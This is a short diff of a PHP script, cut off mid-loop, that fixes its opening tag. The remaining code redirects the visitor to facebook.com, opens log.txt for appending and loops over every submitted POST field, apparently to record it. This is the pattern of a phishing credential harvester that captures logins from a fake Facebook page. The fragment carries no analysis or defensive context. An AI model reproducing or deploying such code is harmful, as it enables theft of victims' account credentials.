@@ -1,4 +1,4 @@
-?php
+<?php
 header ('Location: facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
